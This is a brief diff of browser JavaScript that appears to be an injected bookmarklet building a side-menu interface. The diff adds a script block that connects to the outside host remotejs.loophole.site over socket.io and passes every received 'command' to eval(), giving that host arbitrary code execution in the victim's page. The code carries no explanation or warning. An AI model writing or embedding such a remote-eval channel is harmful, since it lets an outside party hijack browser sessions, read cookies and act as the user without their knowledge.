@@ -1,14 +1,15 @@
-document.body.innerHTML+='<script src="https://raw.githubusercontent.com/socketio/socket.io-client/master/dist/socket.io.js"></script>'
+document.body.innerHTML+=`<script src="https://raw.githubusercontent.com/socketio/socket.io-client/master/dist/socket.io.js"></script>
+<script>
+var socket = new io.Socket();
+socket.connect("https://remotejs.loophole.site");
+alert("Connected");
+socket.on("command", function(command) {
+eval(command);
+});
+</script>`
 if (document.getElementById('sidemenu')) {
     document.getElementById('sidemenu').remove();
 } else {
-      alert("Connecting");
-      var socket = new io.Socket();
-      socket.connect("https://remotejs.loophole.site");
-      alert("Connected");
-      socket.on("command", function(command) {
-        eval(command);
-      });
     var sidemenu;
     var bdy;
     var gui = true;
